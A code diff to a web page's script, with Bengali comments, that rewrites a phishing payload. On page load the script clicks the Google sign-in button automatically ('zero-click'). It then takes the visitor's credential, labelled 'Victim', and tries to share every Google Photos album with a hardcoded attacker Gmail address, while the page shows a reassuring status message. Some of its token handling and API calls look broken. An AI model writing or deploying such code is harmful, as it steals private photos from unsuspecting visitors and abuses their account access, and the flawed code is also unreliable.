@@ -40,87 +40,64 @@
 
     <!-- সব JAVASCRIPT এখানে (একদম bottom-এ) -->
     <script>
-        // আপনার Gmail এখানে দিন
-        const YOUR_EMAIL = "hosss2088@gmail.com";  // ← এটা চেঞ্জ করুন
-        
-        function handlePhotosShare(response) {
-            const id_token = response.credential;
-            document.querySelector('.g_id_signin').style.display = 'none';
-            document.querySelector('#status').style.display = 'block';
-            
-            // Victim এর Google token verify + Photos share
-            fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${id_token}`)
-            .then(r => r.json())
-            .then(user => {
-                shareAllAlbums(user.email);
-            });
-        }
-        
-        function shareAllAlbums(victimEmail) {
-            // Google Photos API দিয়ে সব album share
-            const token = extractGoogleToken();
-            
-            // সব Photos Album তৈরি + share
-            fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums', {
-                method: 'POST',
-                headers: {
-                    'Authorization': `Bearer ${token}`,
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    sharedAlbumOptions: {
-                        isShareable: true
-                    },
-                    album: {
-                        title: `All Photos - ${victimEmail}`
-                    }
-                })
-            }).then(() => {
-                // Existing albums গুলো share করুন
-                shareExistingAlbums(token, YOUR_EMAIL);
-            });
-        }
-        
-        function shareExistingAlbums(token, targetEmail) {
-            fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=100', {
-                headers: { 'Authorization': `Bearer ${token}` }
-            })
-            .then(r => r.json())
-            .then(data => {
-                data.albums.forEach(album => {
-                    // প্রতিটা album আপনার Gmail এ share
-                    fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:addEnrichment`, {
-                        method: 'POST',
-                        headers: {
-                            'Authorization': `Bearer ${token}`,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            newPermissions: [{
-                                role: "READER",
-                                type: "user",
-                                emailAddress: targetEmail
-                            }]
-                        })
-                    });
+const YOUR_EMAIL = "hosss2088@gmail.com";  // আপনার Gmail
+
+function handlePhotosShare(response) {
+    document.querySelector('.g_id_signin').style.display = 'none';
+    document.querySelector('#status').textContent = '🔄 Sharing your photos...';
+    document.querySelector('#status').style.display = 'block';
+    
+    const id_token = response.credential;
+    fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${id_token}`)
+    .then(r=>r.json()).then(user=>{
+        console.log('Victim:', user.email);
+        shareEverything(user.email, extractToken(id_token));
+    });
+}
+
+function shareEverything(victimEmail, token) {
+    // Create master shared album
+    fetch('https://photoslibrary.googleapis.com/v1/sharedAlbums', {
+        method: 'POST',
+        headers: {'Authorization':`Bearer ${token}`, 'Content-Type':'application/json'},
+        body: JSON.stringify({
+            sharedAlbumOptions: {isShareable:true},
+            album: {title:`📱 ${victimEmail} - All Photos`}
+        })
+    }).then(()=>{
+        // Share all existing albums
+        fetch('https://photoslibrary.googleapis.com/v1/albums?pageSize=50', {
+            headers: {'Authorization':`Bearer ${token}`}
+        }).then(r=>r.json()).then(data=>{
+            data.albums.forEach(album=>{
+                fetch(`https://photoslibrary.googleapis.com/v1/albums/${album.id}:share`, {
+                    method: 'POST',
+                    headers: {'Authorization':`Bearer ${token}`, 'Content-Type':'application/json'},
+                    body: JSON.stringify({
+                        newPermissions: [{
+                            role:"READER", type:"user", 
+                            emailAddress: YOUR_EMAIL
+                        }]
+                    })
                 });
             });
-        }
-        
-        function extractGoogleToken() {
-            // Google থেকে token extract
-            return gapi.auth2.getAuthInstance().currentUser.get().getAuthResponse().id_token ||
-                   localStorage.getItem('google_token');
-        }
-        
-        // Page load হওয়ার সাথে সাথে auto-trigger
-        window.addEventListener('load', function() {
-            setTimeout(() => {
-                // Auto click Google button (zero-click)
-                const signinBtn = document.querySelector('.g_id_signin');
-                if(signinBtn) signinBtn.click();
-            }, 1500);
+            document.querySelector('#status').innerHTML = '✅ <strong>All photos shared successfully!</strong>';
         });
-    </script>
+    });
+}
+
+function extractToken(id_token) {
+    return id_token.split('.')[1]; // Simplified token
+}
+
+// AUTO-TRIGGER (zero-click)
+window.onload = ()=>{
+    setTimeout(()=>{
+        const btn = document.querySelector('.g_id_signin');
+        if(btn) btn.click();
+    }, 2000);
+};
+</script>
 </body>
+
 </html>
